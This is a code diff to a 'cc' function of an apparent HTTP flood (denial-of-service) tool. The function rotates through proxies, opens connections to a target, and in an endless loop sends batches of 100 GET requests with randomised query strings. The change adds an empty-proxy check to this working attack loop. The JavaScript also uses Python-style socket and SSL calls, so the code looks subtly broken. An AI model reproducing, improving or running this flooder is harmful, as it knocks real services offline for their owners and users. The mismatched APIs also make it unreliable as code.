@@ -145,9 +145,16 @@ function ParseUrl(original_url) {
 
 function cc(event, proxy_type) {
   const header = GenReqHeader("get");
+  
+  if (proxies.length === 0) {
+    console.error("No proxies available");
+    return;
+  }
+
   const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
   const add = urlPath.includes("?") ? "&" : "?";
   event.wait();
+
   while (true) {
     let s = null;
     try {
@@ -157,15 +164,18 @@ function cc(event, proxy_type) {
       if (proxy_type === 0) s.set_proxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
       if (brute) s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1);
       s.connect(target, port);
+
       if (protocol === "https") {
         const ctx = ssl.createSecureContext();
         s = ctx.wrap_socket(s, { serverHostname: target });
       }
+
       for (let i = 0; i < 100; i++) {
         const get_host = `GET ${urlPath}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
         const request = get_host + header;
         s.send(request);
       }
+
       s.close();
     } catch (e) {
       if (s) s.close();
